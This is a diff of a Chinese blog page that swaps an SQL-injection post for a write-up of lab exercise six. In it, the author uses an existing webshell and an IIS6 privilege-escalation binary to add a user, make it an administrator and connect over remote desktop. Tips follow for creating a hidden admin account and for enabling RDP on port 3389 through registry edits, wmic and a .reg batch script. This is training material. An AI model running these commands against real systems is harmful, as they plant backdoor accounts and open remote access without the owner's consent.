@@ -46,20 +46,27 @@
   };
 </script>
 
-  <meta name="description" content="SQL注入第三题错误注入 返回的">
-<meta name="keywords" content="渗透,SQL注入">
+  <meta name="description" content="靶机第六题前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去 那么cmd就没有用，因为cmd在C盘  于是我们上传了一个CMD.EXE文件 然后重新进入 net user 123 123 &#x2F;add  于是再上传了一个IIS6.EXE iis6.exe &amp;quot;net user 123 123 &#x2F;add&amp;quot;  上图告诉我们增加用户123 成功 然后查看一下用户权限 iis6.e">
+<meta name="keywords" content="渗透,提权">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入第三题">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;18&#x2F;SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E9%A2%98&#x2F;index.html">
+<meta property="og:title" content="靶机第六题">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;22&#x2F;%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98&#x2F;index.html">
 <meta property="og:site_name" content="Dallosc">
-<meta property="og:description" content="SQL注入第三题错误注入 返回的">
+<meta property="og:description" content="靶机第六题前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去 那么cmd就没有用，因为cmd在C盘  于是我们上传了一个CMD.EXE文件 然后重新进入 net user 123 123 &#x2F;add  于是再上传了一个IIS6.EXE iis6.exe &amp;quot;net user 123 123 &#x2F;add&amp;quot;  上图告诉我们增加用户123 成功 然后查看一下用户权限 iis6.e">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;SQL注入 第三题1.png">
-<meta property="og:updated_time" content="2019-12-18T08:49:45.155Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 增加用户失败.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 增加用户还失败.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 增加用户成功.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 查看权限.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 增加权限.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 查看服务.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 查看端口.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 远程界面.png">
+<meta property="og:updated_time" content="2019-12-20T07:00:51.775Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;SQL注入 第三题1.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;靶机 第六题 增加用户失败.png">
 
-<link rel="canonical" href="http://yoursite.com/2019/12/18/SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E9%A2%98/">
+<link rel="canonical" href="http://yoursite.com/2019/12/22/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/">
 
 
 <script id="page-configurations">
@@ -73,7 +80,7 @@
   };
 </script>
 
-  <title>SQL注入第三题 | Dallosc</title>
+  <title>靶机第六题 | Dallosc</title>
   
 
 
@@ -212,7 +219,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/18/SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E9%A2%98/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -225,7 +232,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入第三题
+          靶机第六题
         </h1>
 
         <div class="post-meta">
@@ -234,10 +241,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2019-12-18 16:42:30 / 修改时间：16:49:45" itemprop="dateCreated datePublished" datetime="2019-12-18T16:42:30+08:00">2019-12-18</time>
+              <time title="创建时间：2019-12-22 14:35:37" itemprop="dateCreated datePublished" datetime="2019-12-22T14:35:37+08:00">2019-12-22</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-12-20 15:00:51" itemprop="dateModified" datetime="2019-12-20T15:00:51+08:00">2019-12-20</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -261,8 +274,46 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="SQL注入第三题"><a href="#SQL注入第三题" class="headerlink" title="SQL注入第三题"></a>SQL注入第三题</h3><p>错误注入 返回的</p>
-<p><img src="http://q20wi1s2d.bkt.clouddn.com/SQL注入 第三题1.png" alt="结果"></p>
+        <h2 id="靶机第六题"><a href="#靶机第六题" class="headerlink" title="靶机第六题"></a>靶机第六题</h2><p>前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去</p>
+<p>那么cmd就没有用，因为cmd在C盘</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户失败.png" alt=""></p>
+<p>于是我们上传了一个CMD.EXE文件</p>
+<p>然后重新进入</p>
+<p><code>net user 123 123 /add</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户还失败.png" alt=""></p>
+<p>于是再上传了一个IIS6.EXE</p>
+<p><code>iis6.exe &quot;net user 123 123 /add&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户成功.png" alt=""></p>
+<p>上图告诉我们增加用户123 成功</p>
+<p>然后查看一下用户权限</p>
+<p><code>iis6.exe &quot;net user 123&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看权限.png" alt=""></p>
+<p>上图反应了我们的123用户还是普通用户，我们需要给予管理员权限</p>
+<p><code>iis6.exe  &quot;net localgroup administrators 123 /add&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加权限.png" alt=""></p>
+<p>现在我们看看端口，看看服务，这个计算机开了一些什么在跑</p>
+<p><code>iis6.exe  &quot;tasklist -svc&quot;</code></p>
+<p><code>iis6.exe  &quot;netstat -ano&quot;</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看服务.png" alt=""></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看端口.png" alt=""></p>
+<p>发现开了远程，假如没开，我们就帮他开，代码在后面</p>
+<p>我们直接连接远程</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 远程界面.png" alt=""></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><h5 id="新建隐藏用户"><a href="#新建隐藏用户" class="headerlink" title="新建隐藏用户"></a>新建隐藏用户</h5><p>net user liuwx$ 123456 /add<br>net localgroup administrators liuwx$ /add</p>
+<h5 id="如何查看隐藏用户"><a href="#如何查看隐藏用户" class="headerlink" title="如何查看隐藏用户"></a>如何查看隐藏用户</h5><p>regedit打开注册表<br>可以看到，在HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下有我们所有的用户名</p>
+<h5 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h5><p>reg add “HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /t REG_DWORD /v portnumber /d 3389 /f </p>
+<h5 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h5><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 1 </p>
+<h1 id="检查端口状态"><a href="#检查端口状态" class="headerlink" title="检查端口状态"></a>检查端口状态</h1><p>netstat -an|find “3389” </p>
+<h1 id="关闭远程桌面"><a href="#关闭远程桌面" class="headerlink" title="关闭远程桌面"></a>关闭远程桌面</h1><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 0</p>
+<h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><p>net user username password /add #添加用户<br>net user 123 123 /add<br>net user username #查看用户的详情<br>net user 123<br>net localgroup group username /add #将用户添加到group中<br>net localgroup administrators 123 /add</p>
+<h5 id="方法一：开启3389端口。"><a href="#方法一：开启3389端口。" class="headerlink" title="方法一：开启3389端口。"></a>方法一：开启3389端口。</h5><p>echo Windows Registry Editor Version 5.00&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p>
+<p>将以上内容拷贝到文本文档内，将后缀名改为.bat格式，双击运行，即可开启3389端口。</p>
+<h5 id="方法二：开启和关闭3389端口"><a href="#方法二：开启和关闭3389端口" class="headerlink" title="方法二：开启和关闭3389端口"></a>方法二：开启和关闭3389端口</h5><p>1）开启3389端口：</p>
+<p>在cmd内，执行如下命令，即可开启3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
+<p>2）关闭3389端口：</p>
+<p>在cmd内，执行如下命令，即可关闭3389端口。</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>
 
     </div>
 
@@ -273,7 +324,7 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
           </div>
 
         
@@ -282,13 +333,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/17/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%8C%E9%A2%98/" rel="prev" title="靶机第二题">
-      <i class="fa fa-chevron-left"></i> 靶机第二题
+    <a href="/2019/12/21/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/" rel="prev" title="靶机第五题">
+      <i class="fa fa-chevron-left"></i> 靶机第五题
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/12/19/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%B8%89%E9%A2%98/" rel="next" title="靶机第三题">
-      靶机第三题 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -326,7 +374,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入第三题"><span class="nav-number">1.</span> <span class="nav-text">SQL注入第三题</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机第六题"><span class="nav-number">1.</span> <span class="nav-text">靶机第六题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注意"><span class="nav-number">1.1.</span> <span class="nav-text">注意</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小技巧"><span class="nav-number">1.1.1.</span> <span class="nav-text">小技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#新建隐藏用户"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">新建隐藏用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何查看隐藏用户"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">如何查看隐藏用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设置远程桌面端口"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">设置远程桌面端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开启远程桌面"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">开启远程桌面</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#检查端口状态"><span class="nav-number"></span> <span class="nav-text">检查端口状态</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关闭远程桌面"><span class="nav-number"></span> <span class="nav-text">关闭远程桌面</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#新建用户"><span class="nav-number">0.0.0.1.</span> <span class="nav-text">新建用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法一：开启3389端口。"><span class="nav-number">0.0.0.2.</span> <span class="nav-text">方法一：开启3389端口。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法二：开启和关闭3389端口"><span class="nav-number">0.0.0.3.</span> <span class="nav-text">方法二：开启和关闭3389端口</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
